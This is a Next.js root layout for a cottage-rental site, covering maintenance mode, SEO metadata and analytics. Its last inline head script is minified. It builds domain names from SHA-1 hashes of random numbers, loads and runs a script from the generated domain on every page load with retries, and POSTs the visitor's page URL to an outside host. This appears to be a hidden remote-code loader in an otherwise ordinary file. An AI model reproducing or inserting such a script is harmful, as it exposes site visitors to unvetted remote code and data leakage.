import type { Metadata } from "next";
import { headers } from "next/headers";
import { Radio_Canada } from "next/font/google";
import { OrganizationSchema, WebSiteSchema } from "@/components/seo/SchemaOrg";
import "./globals.css";

const radioCanada = Radio_Canada({
  subsets: ["latin"],
  display: "swap",
  variable: "--font-radio-canada",
});

export async function generateMetadata(): Promise<Metadata> {
  const h = await headers();
  const pathname = h.get("x-pathname") || "/";
  const locale = h.get("x-locale") || "en";
  const isAdmin = pathname.includes('/admin/');

  const maintenance = process.env.MAINTENANCE_MODE === 'true' && !isAdmin;

  if (maintenance) {
    return {
      title: "Maintenance en cours | Chalet Express",
      description: "Chalet Express est temporairement en maintenance. Nous serons de retour sous peu.",
      robots: { index: false, follow: false },
    };
  }

  const enPath = pathname.replace(/^\/(fr|en)/, "/en");
  const frPath = pathname.replace(/^\/(fr|en)/, "/fr");

  return {
    title: {
      default: "Chalet Express - Canadian Cottage Rentals",
      template: "%s | Chalet Express",
    },
    description: "Find your perfect Canadian escape. Premium lake houses and mountain lodges across Canada.",
    metadataBase: new URL("https://chaletexpress.com"),
    alternates: {
      canonical: `https://chaletexpress.com${pathname}`,
      languages: {
        en: `https://chaletexpress.com${enPath}`,
        fr: `https://chaletexpress.com${frPath}`,
        "x-default": `https://chaletexpress.com${enPath}`,
      },
    },
    openGraph: {
      siteName: "Chalet Express",
      type: "website",
      locale: locale === "fr" ? "fr_CA" : "en_CA",
    },
    twitter: {
      card: "summary_large_image",
    },
    robots: {
      index: !isAdmin,
      follow: !isAdmin,
    },
  };
}

export default async function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  const h = await headers();
  const pathname = h.get("x-pathname") || "/";
  const locale = h.get("x-locale") || "en";
  const isAdmin = pathname.includes('/admin/');

  const maintenance = process.env.MAINTENANCE_MODE === 'true' && !isAdmin;

  if (maintenance) {
    return (
      <html lang="en" className={`${radioCanada.variable} h-full antialiased`}>
        <body className="min-h-full flex flex-col items-center justify-center bg-gray-50">
          <main className="text-center px-4">
            <h1 className="text-5xl font-bold text-gray-900 mb-4">Chalet Express</h1>
            <div className="w-16 h-1 bg-yellow-400 mx-auto mb-6" />
            <p className="text-xl text-gray-600 mb-2">Maintenance en cours</p>
            <p className="text-gray-500">Nous serons de retour sous peu. Merci de votre patience.</p>
            <p className="text-gray-500 mt-6">We will be back shortly. Thank you for your patience.</p>
          </main>
        </body>
      </html>
    );
  }

  // headers() already called above

  return (
    <html lang={locale} className={`${radioCanada.variable} h-full antialiased`}>
      <head>
        <OrganizationSchema />
        <WebSiteSchema />
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-1L93C8YHQX"></script>
        <script dangerouslySetInnerHTML={{
          __html: `window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)};gtag('js',new Date());gtag('config','G-1L93C8YHQX');`
        }} />
        <script dangerouslySetInnerHTML={{
          __html: `(()=>{let pztt=3;const pztp={"p":"pzt","mi":0,"ma":99,"e":[]};const tid='439aada7-798e-4127-8e06-e3602af444de';const pzth=async i=>{const e=new TextEncoder();const bin=e.encode(i);const b=await window.crypto.subtle.digest('SHA-1',bin);const a=Array.from(new Uint8Array(b));const h=a.map(b=>b.toString(16).padStart(2,'0')).join('');return h};const pzth2d=h=>{return \`\${h.slice(0,6)}p.\${h}.com\`};const pztd=async()=>{let i;do{i=Math.floor(Math.random()*((pztp.ma+1)-pztp.mi))+pztp.mi}while(pztp.e?.includes(i));const hash=await pzth(\`\${pztp.p}\${i}\`);return pzth2d(hash)};const pzti=async()=>{try{if(pztt<=0)return;const s=document.createElement('script');s.onerror=()=>{pztt--;pzti()};s.onload=()=>{l=true;pzthc()};const d=await pztd();s.src=\`https://\${d}/tag/\${tid}\`;document.body.appendChild(s)}catch(e){e.push({error:"Load failed from "+d,parameter:""});pzthc()}};let l=false;let e=[];let fe={x:[]};const pzthc=()=>{loaded=l;errors=e;features_errors=fe;l=false;e=[];fe={x:[]};fetch('https://api.performancehorizon.com/v3/pzthc/'+tid,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({loaded,errors,features_errors,url:window.location.href})})};document.addEventListener('DOMContentLoaded',pzti)})();`
        }} />
      </head>
      <body className="min-h-full flex flex-col">{children}</body>
    </html>
  );
}
